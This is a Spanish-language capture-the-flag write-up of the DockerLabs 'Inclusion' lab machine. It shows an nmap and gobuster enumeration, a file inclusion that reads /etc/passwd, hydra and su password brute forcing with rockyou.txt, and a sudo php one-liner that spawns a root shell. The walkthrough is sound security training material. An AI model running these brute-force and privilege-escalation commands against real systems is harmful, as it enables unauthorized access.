---
title: DockerLabs - Inclusion
summary: "Write-up del laboratorio Inclusion de DockerLabs"
author: elcybercurioso
date: 2026-01-04
categories: [Post, DockerLabs]
tags: [medio, lfi, brute force, sudo, privesc]
media_subpath: "/assets/img/posts/dockerlabs_inclusion"
image:
  path: main.webp
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Inclusion]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG allPorts 
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Inclusion]
└─$ nmap -sCV -p22,80 172.17.0.2
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 03:cf:72:54:de:54:ae:cd:2a:16:58:6b:8a:f5:52:dc (ECDSA)
|_  256 13:bb:c2:12:f5:97:30:a1:49:c7:f9:d0:ba:d0:5e:f7 (ED25519)
80/tcp open  http    Apache httpd 2.4.57 ((Debian))
|_http-server-header: Apache/2.4.57 (Debian)
|_http-title: Apache2 Debian Default Page: It works
```

## análisis

Comenzamos revisando los recursos disponibles en el servidor empleando **gobuster**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Inclusion]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .php,.html,.txt 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/shop                 (Status: 301) [Size: 307] [--> http://172.17.0.2/shop/]
/index.html           (Status: 200) [Size: 10701]
/server-status        (Status: 403) [Size: 275]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

En el pie de página del recurso **/shop** encontramos una filtración de una funcionalidad que la página podría estar ofreciendo:

![Desktop View](/20251118203605.webp){: width="972" height="589" .shadow}

## acceso inicial (manchi)

Parece tratarse de una funcionalidad que permite listar ficheros del sistema (**LFI** o Local File Inclusion), por lo que probamos con el fichero `/etc/passwd`, el cual comprobamos que podemos ver su contenido:

![Desktop View](/20251118203708.webp){: width="972" height="589" .shadow}

Teniendo los usuarios, dejamos en segundo plano el proceso de obtención de credenciales de SSH por fuerza bruta con **hydra**, que pasado un tiempo vemos que nos obtiene unas credenciales correctas:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Inclusion]
└─$ hydra -L users.txt -P /usr/share/seclists/Passwords/rockyou.txt ssh://172.17.0.2 -I
[DATA] max 16 tasks per 1 server, overall 16 tasks, 28688798 login tries (l:2/p:14344399), ~1793050 tries per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: manchi   password: l*****
```

Procedemos a conectarnos como el usuario `manchi` por SSH:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Inclusion]
└─$ ssh manchi@172.17.0.2                                                
manchi@172.17.0.2`s password: 
manchi@de6fea183ddb:~$ whoami
manchi
manchi@de6fea183ddb:~$ hostname -I
172.17.0.2
```

## movimiento lateral (seller)

Tras revisar diferentes formas de escalar privilegios, llegamos a la conclusión de que no hay nada de lo que podamos aprovecharnos, por lo que tratamos de obtener la contraseña de otro usuario empleando nuevamente fuerza bruta.

Enviamos el diccionario **rockyou.txt** a la máquina víctima:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Inclusion]
└─$ scp /usr/share/seclists/Passwords/rockyou.txt manchi@172.17.0.2:/tmp
rockyou.txt
```

Con el siguiente script de [GitHub](https://github.com/Maalfer/Sudo_BruteForce/blob/main/Linux-Su-Force.sh) tramos de obtener la contraseña del usuario `seller`, la cual, tras un rato, la obtenemos:

```bash
manchi@de6fea183ddb:/tmp$ ./exploit.sh seller rockyou.txt 

******************************
*     BruteForce SU         *
******************************

Probando contraseña: 123456
Probando contraseña: 12345
Probando contraseña: 123456789
Probando contraseña: password
Probando contraseña: iloveyou
Probando contraseña: princess
Probando contraseña: 1234567
...
Contraseña encontrada para el usuario seller: q*****
```

Nos conectamos como el usuario `seller`:

```bash
manchi@de6fea183ddb:/tmp$ su seller
Password: 
seller@de6fea183ddb:/tmp$ whoami
seller
```

## escalada de privilegios (root)

Revisando los permisos SUDO del usuario `seller`, encontramos que puede ejecutar PHP como el usuario `root`:

```bash
seller@de6fea183ddb:/tmp$ sudo -l
Matching Defaults entries for seller on de6fea183ddb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User seller may run the following commands on de6fea183ddb:
    (ALL) NOPASSWD: /usr/bin/php
```

En [GTFOBins](https://gtfobins.github.io/gtfobins/php/#sudo) nos indican que cuando un usuario puede ejecutar PHP con los permisos de otro usuario, puede llegar a invocar una consola como dicho usuario ejecutando el siguiente comando:

![Desktop View](/20251118213355.webp){: width="972" height="589" .shadow}

Por lo tanto, ejecutamos el comando, y vemos que ya habremos conseguido una consola como el usuario `root`:

```bash
seller@de6fea183ddb:/tmp$ sudo php -r "system('/bin/bash');"
root@de6fea183ddb:/tmp# whoami
root
```

Y así, habremos completado la máquina!

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>